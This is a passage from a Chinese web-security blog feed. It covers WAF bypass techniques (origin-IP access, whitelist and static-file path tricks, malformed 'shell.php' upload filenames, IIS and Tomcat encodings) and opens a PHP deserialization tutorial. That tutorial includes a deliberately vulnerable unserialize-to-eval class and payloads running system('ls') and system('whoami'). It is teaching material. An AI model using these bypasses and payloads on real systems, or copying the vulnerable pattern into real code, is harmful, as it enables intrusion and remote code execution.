title="云WAF绕过"></a>云WAF绕过</h3><p>找到真实IP，修改本地hosts文件或者直接在burp中指定解析，避免流量走到云WAF上即可。<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1766067216989-75928077-939b-42a7-850f-525fab117552.png" alt="null"></p><h3 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h3><p>一些WAF为了保证核心功能如登陆功能正常，会在内部设立一个文件白名单，或内容白名单，只要和这些文件或内容有关，无论怎么测试，都不会进行拦截。 如：WAF设立了白名单<code>/admin</code>，那么我们的测试payload可以通过如下的手法来绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 原来被拦截</span><br><span class="line">http://a.a/?id=123 and 2*3=6</span><br><span class="line"># 现在不拦截</span><br><span class="line">http://a.a/?a=/admin&amp;id=123 and 2*3=6</span><br></pre></td></tr></table></figure><h3 id="静态文件绕过"><a href="#静态文件绕过" class="headerlink" title="静态文件绕过"></a>静态文件绕过</h3><p>一些WAF为了减少服务器的压力，会对静态文件如<code>.png</code>、<code>.css</code>等直接放行，那么我们可以尝试伪装成静态文件来绕过 如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 原来被拦截</span><br><span class="line">http://a.a/?id=123 and 2*3=6</span><br><span class="line"># 现在不拦截</span><br><span class="line">http://a.a/?1.jpg&amp;id=123 and 2*3=6</span><br></pre></td></tr></table></figure><h3 id="Content-Type绕过"><a href="#Content-Type绕过" class="headerlink" title="Content-Type绕过"></a>Content-Type绕过</h3><p>一些WAF识别到特定的content-type后，则会判定为该请求的类型，如： 发现<code>Content-Type</code>为<code>multipart/form-data</code>时，会认为这属于文件上传的请求，从而只检测文件上传漏洞，导致不拦截其他类型的payload</p><h3 id="请求方式绕过"><a href="#请求方式绕过" class="headerlink" title="请求方式绕过"></a>请求方式绕过</h3><ol><li><p>一些WAF对于<code>get</code>请求和<code>post</code>请求的处理机制不一样，可能对POST请求稍加松懈，因此给<code>GET</code>请求变成<code>POST</code>请求有可能绕过拦截。</p></li><li><p>一些WAF检测到<code>POST</code>请求后，就不会对<code>GET</code>携带的参数进行过滤检测，因此导致被绕过。</p></li></ol><h3 id="解析兼容性"><a href="#解析兼容性" class="headerlink" title="解析兼容性"></a>解析兼容性</h3><p>一些WAF检测时，完全按照标准的HTTP协议去匹配，但WEB容器会做一些兼容性适配，如上传时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;shell.php&quot;</span><br></pre></td></tr></table></figure><p>我们只需要稍加修改，那么按照标准协议去解析就找不到文件名，从而绕过拦截</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;shell.php</span><br><span class="line">filename=&#x27;shell.php&#x27;</span><br><span class="line">filename=shell.php</span><br></pre></td></tr></table></figure><h2 id="容器特性"><a href="#容器特性" class="headerlink" title="容器特性"></a>容器特性</h2><p> Tip</p><p>可通过所有fuzz一遍，看看容器是如何处理的</p><p><strong>IIS+ASP：</strong></p><ol><li><p><code>%</code>会被自动去掉</p></li><li><p>unicode会自动解码</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; == &lt;%s%cr%u0131pt&gt;</span><br></pre></td></tr></table></figure><p><strong>tomcat:</strong> 路径穿越</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/path1/path2/ == ;/path1;foo/path2;bar/;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;waf绕过&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/212272&quot;&gt;waf绕过拍了拍你-安全KER - 安全资讯平台&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="waf绕过" scheme="https://flypigc.github.io/categories/waf%E7%BB%95%E8%BF%87/"/>
    
    
    <category term="web安全" scheme="https://flypigc.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化基础原理解析</title>
    <link href="https://flypigc.github.io/2025/12/17/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/"/>
    <id>https://flypigc.github.io/2025/12/17/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/</id>
    <published>2025-12-17T11:50:52.499Z</published>
    <updated>2025-12-20T02:08:36.097Z</updated>
    
    <content type="html"><![CDATA[<p>PHP反序列化基础原理解析</p><span id="more"></span><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>1.php面向对象<br>2.序列化基础知识<br>    格式化出来不一样<br>    序列化格式<br>3.魔术方法<br>触发条件</p><p>4.pop链的构造思路</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">写poc代码</span><br></pre></td></tr></table></figure><p>5.反序列化逃逸</p><p>6.session反序列化漏洞</p><p>7.phar反序列化<br>    为协议读取phar，字段里面的字符串自动反序列化<br>    文件上传，魔术方法触发</p><p>面向对象的基本概念<br>面向过程:吃番茄炒蛋,自己炒<br>面向对象:点餐番茄炒蛋</p><p>面向对象就是已经做好了的</p><p>面向对象的三个特折:对象的行为，对象的形态，对象的表示;</p><p>类的定义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">类是定义了一件事物的抽象特点，它将数据的形式以及这些数据上的操作封装在一起。</span><br><span class="line">对象是具有类类型的变量，是对类的实例。</span><br><span class="line"></span><br><span class="line">内部构造:成员变量(属性)+成员函数(方法)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">属性：定义在类内部的变量，该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可成为对象的属性。</span><br><span class="line"></span><br><span class="line">方法：定义在类的内部，可用于访问对象的数据</span><br></pre></td></tr></table></figure><p>成员函数是可以访问成员变量的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>&#123;  </span><br><span class="line">  <span class="keyword">public</span>  <span class="variable">$name</span>=<span class="string">&#x27;chengyaojin&#x27;</span>;  </span><br><span class="line">  <span class="keyword">private</span>  <span class="variable">$sex</span>=<span class="string">&#x27;man&#x27;</span>;  </span><br><span class="line">  <span class="keyword">protected</span>  <span class="variable">$shengao</span>=<span class="string">&#x27;165&#x27;</span>;  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"><span class="variable">$var1</span></span>) </span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$var1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$cyj</span>= <span class="keyword">new</span> <span class="title function_ invoke__">hero</span>();  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;name.<span class="string">&quot;&lt;br /&gt;&quot;</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;sex.<span class="string">&quot;&lt;br /&gt;&quot;</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;shengao.<span class="string">&quot;&lt;br /&gt;&quot;</span>;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>hero</code> 父类、<code>hero2</code> 子类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">公共的</span><br><span class="line">私有的</span><br><span class="line">受保护的：内部、子类可用</span><br><span class="line">public子类可用</span><br><span class="line">private子类不可用</span><br><span class="line">protected子类可用</span><br><span class="line">外部只可用public</span><br><span class="line">子类内部可用public和protected</span><br></pre></td></tr></table></figure><h2 id="反序列化基础知识"><a href="#反序列化基础知识" class="headerlink" title="反序列化基础知识"></a>反序列化基础知识</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">序列化的作用</span><br><span class="line">序列化的表达方式/格式</span><br><span class="line"></span><br><span class="line">方便存储</span><br><span class="line">方便数据传输</span><br><span class="line">空字符   null N;</span><br><span class="line">整型     666  i:666;</span><br><span class="line">浮点型   66.6 d:66.6</span><br><span class="line">Boolean true b:1;</span><br><span class="line">        flase b:0;</span><br><span class="line">字符串   &#x27;benben&#x27;   s:6长度:&quot;benben&quot;;</span><br></pre></td></tr></table></figure><p><strong>字符串序列化</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;benben&#x27;</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#s:6:&quot;benben&quot;;</span></span><br></pre></td></tr></table></figure><p><strong>数组序列化</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&#x27;benben&#x27;</span>,<span class="string">&#x27;dazhaung&#x27;</span>,<span class="string">&#x27;laoliu&#x27;</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># a:3:&#123;i:0;s:6:&quot;benben&quot;;i:1;s:8:&quot;dazhaung&quot;;i:2;s:6:&quot;laoliu&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>a:3是三个数组元素<br>i:0是编号<br>s:6:”benben”;是指benben长度为6<br>i:1是编号</p><p><strong>对象序列化</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># O:4:&quot;test&quot;:1:&#123;s:3:&quot;pub&quot;;s:6:&quot;benben&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>O:4:类名长度<br>“test”类名:1变量数量<br>:{s:3变量名长度<br>:”pub”变量名字;<br>s:6  $pub值的长度<br>:”benben变量值”;}</p><p>属性不一样，序列化结果也不一样<br><strong>私有修饰符</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># O:4:&quot;test&quot;:1:&#123;s:9:&quot;testpub&quot;;s:6:&quot;benben&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>private $pub&#x3D;</p><p>pub前面加了test变成testpub<br>test是类名<br>s:9为什么是9？<br>因为类名test前后各加了一个%00(null,空字符)<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972085857-e08f35f3-47c2-4b57-a1ed-dfae76fb0947.jpg" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;s:9:&quot;testpub&quot;;s:6:&quot;benben&quot;;&#125; O%3A4%3A%22test%22%3A1%3A%7Bs%3A9%3A%22%00test%00pub%22%3Bs%3A6%3A%22benben%22%3B%7D</span><br></pre></td></tr></table></figure><p><strong>成员属性调用对象</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$ben</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ben=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test2</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># O:5:&quot;test2&quot;:1:&#123;s:3:&quot;ben&quot;;O:4:&quot;test&quot;:1:&#123;s:3:&quot;pub&quot;;s:6:&quot;benben&quot;;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#序列化里的对象包含了一个序列化的对象O:4:&quot;test&quot;:1:&#123;s:3:&quot;pub&quot;;s:6:&quot;benben&quot;;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="反序列化知识"><a href="#反序列化知识" class="headerlink" title="反序列化知识"></a>反序列化知识</h2><p>反序列化之后的内容是一个对象<br>反序列化生成的对象里的值，由反序列化里的值提供，与原有类预定义的值无关<br>反序列化不触发类的成员方法；需要调用方法后才能触发</p><p>将反序列化后的参数还原成实例化的对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$a</span> = <span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$b</span> = <span class="number">666</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$c</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$d</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">urlencode</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;benben&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;*b&quot;</span>;i:<span class="number">666</span>;s:<span class="number">7</span>:<span class="string">&quot;testc&quot;</span>;b:<span class="number">0</span>;&#125;</span><br><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>test%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>a%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>benben%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>b%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A666%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>test%<span class="number">00</span>c%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line"><span class="keyword">object</span>(test)<span class="comment">#1 (3) &#123; [&quot;a&quot;]=&gt; string(6) &quot;benben&quot; [&quot;b&quot;:protected]=&gt; int(666) [&quot;c&quot;:&quot;test&quot;:private]=&gt; bool(false) &#125;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$d</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>#1 (3) </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;benben&quot;</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$b</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">666</span>)</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$c</span> =&gt;</span><br><span class="line">  <span class="keyword">bool</span>(<span class="literal">false</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="反序列化漏洞例题"><a href="#反序列化漏洞例题" class="headerlink" title="反序列化漏洞例题"></a>反序列化漏洞例题</h2><p>反序列化生成的对象里的值，由反序列化里的值提供：与原有类预定义的值无关：<br>反序列化漏洞的成因：反序列化过程中，unserialize()接收的值（字符串）可控；<br>通过更改这个值（字符串），得到所需要的代码，即生成的对象的属性值。<br>反序列化不改变类的成员方法；需要调用方法后才能触发<br>通过调用方法，触发代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;echo &quot;this is test!!&quot;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$get</span> = <span class="variable">$_GET</span>[<span class="string">&quot;benben&quot;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$get</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="title function_ invoke__">displayVar</span>() ;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972085953-2c7bf774-3ab5-4dfc-803a-afe3ecbde882.jpg" alt="null"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//$get = &#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:13:&quot;system(&#x27;ls&#x27;);&quot;;&#125;&#x27;;  </span></span><br><span class="line"><span class="comment">//$b = unserialize($get);  </span></span><br><span class="line"><span class="comment">//var_dump($b);  </span></span><br><span class="line"><span class="comment">//$b-&gt;displayVar() ;  </span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:13:&quot;system(&#x27;ls&#x27;);&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>简洁版</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;system(&quot;whoami&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?benben=O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">实例化对象会调用construct</span><br><span class="line">销毁对象会调用destruct</span><br></pre></td></tr></table></figure><p><code>__destruct</code><br>调用了两次destruct<br>为什么？<br>1.先销毁「反序列化生成的匿名对象」→ 触发第一次析构；<br>2.再销毁 <code>$test</code> 指向的原始对象 → 触发第二次析构；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发了析构函数1次&quot;</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span> ;  </span><br><span class="line"> 